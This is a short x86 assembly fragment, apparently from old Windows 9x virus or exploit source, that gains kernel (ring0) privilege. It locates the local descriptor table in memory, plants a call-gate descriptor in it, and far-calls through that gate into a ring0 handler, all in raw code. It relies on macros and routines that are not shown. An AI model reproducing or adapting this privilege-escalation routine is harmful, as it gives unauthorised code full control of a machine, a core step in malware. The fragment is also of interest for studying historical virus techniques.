
; entering ring0 (seh, ldt, callgate)

callring0:              pusha

                        seh_init

                        call    find_ldt_scanmemory

                        call    __popaddr

                        pusha
                        push    ds es

                        push    ss ss
                        pop     ds es

                        call    ring0handler

                        pop     es ds
                        popa
                        retf

__popaddr:              pop     eax

                        fild    qword ptr [ebx]

                        mov     edi, ebx
                        cld
                        stosd
                        stosd
                        mov     dword ptr [ebx+2], 0EC000028h

                        db      9Ah
                        dd      0
                        dw      100b+11b

                        fistp   qword ptr [ebx]

                        seh_done

                        popa
                        ret
